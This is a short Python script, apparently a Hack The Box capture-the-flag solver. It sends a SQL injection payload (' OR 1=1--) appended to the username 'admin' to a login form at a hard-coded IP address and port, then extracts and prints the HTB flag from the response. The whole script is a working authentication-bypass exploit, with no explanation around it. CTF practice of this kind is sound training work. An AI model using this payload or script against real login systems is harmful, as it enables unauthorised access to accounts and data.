import requests
import re

host, port = "94.237.55.96", 45859 #edit host and port
url = f"http://{host}:{port}"

payload = "' OR 1=1--"
request_data = {
    "username": "admin" + payload,
    "password": "admin"
}

response = requests.post(f"{url}", data=request_data)

flag = re.search(r'HTB\{.*?\}',response.text)


print(flag.group(0))